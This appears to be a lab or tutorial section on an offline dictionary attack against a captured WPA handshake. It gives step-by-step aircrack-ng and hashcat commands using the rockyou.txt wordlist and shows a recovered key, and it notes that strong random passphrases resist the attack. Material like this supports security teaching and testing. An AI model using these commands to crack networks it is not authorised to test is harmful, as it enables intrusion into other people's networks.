# 🔑 Offline Dictionary Attack

This component covers verifying the captured handshake and running the offline dictionary attack with `aircrack-ng` against the `rockyou.txt` wordlist.

---

## Overview

```
capture-01.cap
      │
      ▼
Handshake Verification (aircrack-ng)
      │
      ├─ 0 handshakes → go back to Handshake Capture
      │
      └─ 1 handshake ✔
            │
            ▼
     Dictionary Attack
     (aircrack-ng + rockyou.txt)
            │
            ├─ KEY FOUND ✔
            │
            └─ Exhausted wordlist → try larger list or hashcat
```

---

## Step 1 — Verify the Handshake

Before spending time on cracking, confirm the `.cap` contains a valid EAPOL exchange:

```bash
aircrack-ng capture-01.cap
```

Expected output for a good capture:

```
1 handshake captured — WPA (1 handshake)
Please specify a dictionary (option -w).
```

If the output says **"No networks found"** or **"0 handshakes"**, return to the capture phase.

---

## Step 2 — Locate the Wordlist

On most Kali builds `rockyou.txt` ships pre-installed but compressed:

```bash
find / -name "rockyou*" 2>/dev/null
```

If it is still gzipped at `/usr/share/wordlists/rockyou.txt.gz`:

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

If it already exists as a plain `.txt`, skip decompression.

---

## Step 3 — Run the Attack

```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

`aircrack-ng` tests each candidate passphrase from the wordlist against the captured EAPOL frames. No network contact is required — the entire attack is offline.

---

## Result

```
KEY FOUND! [ 987654321 ]
```

The passphrase was recovered because it was a weak, all-numeric value present in `rockyou.txt`. A high-entropy random passphrase would not appear in any wordlist and would be impractical to brute force.

---

## Optional: GPU Acceleration with hashcat

For larger wordlists or rule-based attacks, convert the `.cap` to hashcat format:

```bash
hcxpcapngtool -o capture.hc22000 capture-01.cap
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
```

GPU cracking is orders of magnitude faster than CPU-based `aircrack-ng` for exhaustive attacks.
